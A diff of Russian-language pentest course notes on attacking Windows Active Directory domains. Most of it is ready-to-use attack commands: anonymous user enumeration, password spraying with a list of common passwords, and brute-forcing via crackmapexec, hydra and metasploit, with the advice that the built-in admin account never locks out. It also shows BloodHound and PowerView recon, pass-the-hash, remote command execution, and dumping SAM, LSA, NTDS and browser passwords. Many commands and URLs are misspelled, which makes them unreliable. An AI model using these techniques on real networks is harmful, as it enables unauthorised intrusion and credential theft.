@@ -1035,62 +1035,91 @@ https://pentestlab.blog/tag/local-exploits/
 
 
 
-Атаки на домен(95%)
+Атаки на домен
 
 msf6> use auxiliary/scanner/smb/pipe_auditor				Чекаем все пайпы
 
 
 PIPE Samr
-Вывести список доменных пользователей 
+Только воткнушвись в сеть сразу можем узнать список пользователей
+
+Сработает только с анонимным доступом к pipe samr
+msf6> use auxiliary/scanner/smb/pipe_auditor
+
 $ sudo rpcclient -N 192.168.1.65 -U "" 
-rpcclient $> enumdomusers
+rpcclient $> enumdomusers						
 
+https://github.com/m8r0w/nulliux
+$ python nullinux.py 192.168.1.65
 
-
-Enum Домена
-https://github.com/m8r0wn/nullinux
-$ python3 nullinux <ip>
-
-или 
-$ enum4linux <ip>
+$ eum4linux 192.168.1.60 -U
 Если 
 [+] Password Info for Domain:
 	..
-	[+] Account Lockout Threshhold: <None>/<5>				Смотрим, стоит ли ограничение на число неудачных попыток входа
-	[+] Reset Account Lockout Counter: <30>/<Never>				Время до сброса числа неудачных входов	(Never - очень опасно)				
+	[+] Account Lockout Threshhold: <None>/<5>		Смотрим, стоит ли ограничение на число неудачных попыток входа
+	[+] Reset Account Lockout Counter: <30>/<Never>		Время до сброса числа неудачных входов	(Never - очень опасно)				
 
 
 
-Password spraying
+Password spraying (95%)
 Идем с одним паролем сразу на все учетки
 
-Vfhn2021		На раскладке Март2021
+Vfhn2021		На раскладке Март2021 (Берем последне 2-3 месяца)
 Vfhn2021!		Такая же логика
 Atdhfkm2021
 Atdhfkm2021!
-P@ssw0rd
-Aa12345678		Тоже очень частый пароль
+P@ssw0rd		Часто всречается		
+P@ssw0rd1
+Aa12345678		Очень частый пароль
 1qaz@WSX		Частый геометрический пароль  
 !QAZ2wsx
 
-
-
-Брут
+Идем на любую доменную машину
 $ crackmapexec smb <ip> -u <словарь с логинами> -p <P@ssw0rd@1> <!QAZ2wsx> --continue-on-success
-$ hydra -L <user.txt> -p Password@1 <id> smb						Но, в отличии от прошлого варианта, не отображает, что учетки начали лочиться
+
+$ hydra -L <user.txt> -p Password@1 <id> smb		Но, в отличии от прошлого варианта, не отображает, что учетки начали лочиться
+
 msf6> smb/smb_login
+	set rhost <ip>					Ставим олько один адрес, иначе залочим домен
+	set user_file <user.txt>
+	set pass_file <pass.txt>
+	set SMBDomain			
+
 $ patator smb_login host=<ip> user=FILE0 0=<file> password=Password@1
 
-Пароль доменного администратора никогда не лочится => брутаем сколько хотим
+Пароль доменного администратора (RID=500) никогда не лочится => брутаем сколько хотим
 
 
 
+ADModule
 https://github.com/samratashok/ADModule
-
-
+C:\> powershell -nop -exec bypas
+PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Managemet.dll -Verbose
+PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.ps d1
+PS C:\> Get-Command -Module ActiveDirectory
+PS C:\> Get-ADDomain					Получить данные о текущем домене
+PS C:\> Get-ADDomain -Identity 				Получить данные о конкреном домене
+PS C:\> (Get-ADDomain).DomainSID			Получить SID домена
 
 PowerView
 https://github.com/PowerShellMafia/PowerSploit
+C:\PowerSploit-3.0.0\Recon> powershell -nop -exec bypas
+C:\> runas /noprofile /netonly /user:<deligatio.local\IvanovSR> "powershell -nop -exec bypass"	Запускаем от имени взломанного пользователя
+PS C:\> Import-Module PowerView.ps1
+PS C:\> Get-NetDomain					Получить данные о текущем домене
+PS C:\> Get-NetDomain -Domain <domain.local>		Получить данные о конкреном домене
+PS C:\> Get-DomainSID					Получить SID домена
+PS C:\> Get-NetUser					Позволяет вытащить samaccountname
+PS C:\> Get-NetGroup <group> -Recurse			Рекурсивно проходим по группам в случае, если есть вложенныые группы
+PS C:\> Get-NetLoggedon -ComputerName ps-dima		Пользователи, залогиненные на выбраном компьютере
+PS C:\> Get-NetComputer -FullData			Информация о компьютере
+PS C:\> Find-LocalAdminAccess -Verbose			Узнать, куда подойдет учетка, от которой запущен PS
+PS C:\> Get-NetProcess -ComputerName 			Узнать запущенные процессы (тупой юзер не станет запускать putty)
+
+Реально полезная команда
+PS C:\> Invoke-UserHunter -UserName <username>		Ищем все мавшины, на которых сидит пользователь				
+
+Это позволяет узнать диапазоны адресов, в которых есть домен контроллеры, и следовательно, которые нужно просканировать
 
 
 
@@ -1099,7 +1128,9 @@ CRTP - индусский курс по powershell. Есть много слив
 
 
 
+EMPIRE позволяет управлять ботнетами через Comand&Controll
 wc -l <file>		Подсчитать кол-во строк в файле
+В Винде с строке с путем, если заменить все на CMD, то откроется консоль в текущей директории
 
 
 
@@ -1107,43 +1138,122 @@ wc -l <file>		Подсчитать кол-во строк в файле
 
 Занятие 9
 
-hashdump - вытаскивает все локальные учетки
-
-
-
-Get-NetLoggedon - пользователи, залогиненные на компьютере
-
-Find-LocalAdminAccess -Verbose - список машин и доступ к ним
-
-Invoke-UserHunter
-
-
-
 Bloodhound (Linux Domain enumeration)
 https://github.com/BloodHoundAD/BloodHound
+в репозитории лежат Collectors, их нужно регулярно скачивать заново
 
-Default - local admins, group members, domain trusts, sessions
-Group - group membership
-LocalGroup - local admins
-GPOLocalGroup - 
-ComputerOnly - local admin, session
-Sessions - user sessioin
-LoggedOn - 
+Default  	local admins on machines, group members, domain trusts, sessions
+Group  		group members
+LocalGroup  	local admins
+GPOLocalGroup 	local admins через GPO
+ComputerOnly  	local admin, session
+Sessions  	user sessioin
+LoggedOn  	залогненные пользователи
+Trust		domainn trusts для определенных доменов
+ACL		ACL с домена
+Container	информация о контейнерах
+All		все вышеперечисленное
 
 Collectors для bloodhound необходимо скачивать заново (часто обновляются)
 
+Рекомендованный коллектор SharpHound.exe
+Invoke-Bloodhound -CollectionMethod Group,Trusts,ACL,ObjectProps,Container,GPOLocalGroup -Threads 25
+Invoke-loodHound -CollectionMethodSession -Threads25
+Invoke-Bloodhound -CollectionMethodRDP,LocalGroup -Threads25
+
+Можно загрузить exe-шник на пробитую машину и запустить команду
+SharpHound.exe -c Container,Group,OjectProps,ACL,Trusts,DCOnly,GPOLocalGroup --excludedomaincontrollers
+
+Полученные архивы кидаем в главное окно bloodhound
+
+Node Info
+Информация о связях
+
+Analysis (Queries)
+Можно найти кратчайшее расстояние до Domain Admin
+или выполниить другие полезные действия
+
+Если нажать ПКМ на название связи между нодами и перейти во вкладку abuse, можно найти гайд по взлому
+
+Доп материалы BloodHound
+1. Custom Queries (запросы для получения кратчайшего путии к админу и т п)
+https://github.com/seajaysec/c7f0995b5a6a2d30515accde8513f77d
+2. ПО для выгрузки/загрузки owned объектов
+https://github.com/porterhau5/BloodHound-Owned
+3. Custom Queries для вызова напрямую из bloodhound
+https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json
+
+Реальный пример
+1. $ docker run --publish=7474:7474 --pulish=7687:7687 --volume=$HOME/neo4j/data:/data neo4j
+2. http://localhost:7474
+3. меняем пароль (дефолт neo4j:neo4j)
+4. $ bloodhound
+5. вводим данные базы
+6. качаем Collectors
+7. пробиваем машину, делаем хешдамп, подбираем куда подойдет
+8. meterpreter> upload SharpHound.exe
+9. SharpHound.exe -c Container,Group,OjectProps,ACL,Trusts,DCOnly,GPOLocalGroup --excludedomaincontrollers
+10. meterpreter> download 2020_BloodHound.zip
+11. перетаскиваем в bloodhound
 
 
-ADiDNSDump
+
+ADIDNSDump
+Domain Enumeration при помощи Linux
+
 https://github.com/dirkjanm/adidnsdump
 $ adidnsdump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65
+$ cat records.csv
 
 
 
-Ldapdomaindump		Собирает информацию о домене и представляет ее в красивом виде
+Ldapdomaindump		
+Собирает информацию о домене и представляет ее в красивом виде
+
 https://github.com/dirkjanm/ldapdomaindump
 $ python3 setup.py install
-$ ldapdomaindump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65
+$ ldapdomaindump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65 -o .
+
+
+
+ldapsearch
+$ ldapsearch -E pr=1000/noprompt -LLL -x ldap://10.64.196.11 -D "user@domain.local" -w password -b dc=domain,dc=com '(&(objectCategory=person)(ojectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName | grep sAMAccountName | cut -d: -f2-
+Найти только enable учетки (удобно для password spraying)
+
+
+
+windapsearch
+https://githu.com/ropnop/windapsearch
+$ sudo apt-get install python3-ldap
+$ sudo python3 windapsearch.py
+--da 			domain admins
+-PU			привилегированные пользователи
+--admin-ojects		пользователи, которые скорее всего имеют права админа (по косвенным признакам)
+--user-spns		пользователи, подверженные kerberoastinng
+
+
+
+Crack Map Exec
+https://github.com/byt3bl33d3r/CrackMapExec
+$ sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential	зависимости
+--local-auth		если идем на локальную учетку (по умолчанию идем на доменную)
+-H <hahs>		атака pass the hash
+-x "<ipconfig>"		выполнить командуна хосте (нужно запускать с sudo)
+-L 			список модулей
+-M 			использовать модуль
+(Pwn3d!)		юзер является локальным админом
+
+Наборы флагов
+Выполнение кода
+$ sudo cme smb 192.168.1.11 -u Administrator -p "P@ssw0rd" -x "whoami"
+Шары, хеши, сессиии, lsasecrets, залогиненные юзеры
+$ sudo cme smb 192.168.1.11 -u Administrator -p "P@ssw0rd" --local-auth --sam --lsa --shares --ntds --sessions --loggedon-users
+Модули:
+	enum_chrome			пароли из хрома
+	get_netdomaincontroller		список домен-контроллеров
+	get_netrdpsession		активные RDP сессии
+	gpp_password			полезная инфа + пароли в чистом виде из GPP
+	invoke_sessiongopher		вытаскиваем сессии из PuTTY WinSCP FileZilla RDP. Очень полезно, ноп алится, лучше использовать оттдельной утилитой
 
 
 post/widows/gather/credetials/gpp
